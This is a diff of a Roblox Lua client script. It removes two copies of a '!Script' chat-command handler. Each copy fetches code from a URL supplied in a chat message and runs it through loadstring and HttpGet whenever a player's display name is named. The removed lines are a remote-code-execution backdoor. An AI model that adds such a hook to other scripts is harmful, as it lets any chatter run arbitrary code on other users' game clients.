@@ -59,20 +59,6 @@ for i, v in pairs(Players) do
 			end
 
 
-			local Group = {}
-
-			for v in Command:gmatch("[^%s]+") do
-			table.insert(Group, v)
-			end
-
-				
-			if Group[1] == "!Script" then
-				if Group[2] == game.Players.LocalPlayer.DisplayName then
-					loadstring(game:HttpGet("https://".. Group[3]))()
-				end
-			end
-
-
 
 
 		end)
@@ -168,20 +154,6 @@ game.Players.PlayerAdded:Connect(function(Player)
 				while true do
 					wait()
 					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(CommandParts[2]).Character:WaitForChild("HumanoidRootPart").CFrame
-				end
-			end
-
-
-			local Group = {}
-
-			for v in Message:gmatch("[^%s]+") do
-			table.insert(Group, v)
-			end
-
-					
-			if Group[1] == "!Script" then
-				if Group[2] == game.Players.LocalPlayer.DisplayName then
-					loadstring(game:HttpGet("https://".. Group[3]))()
 				end
 			end
 
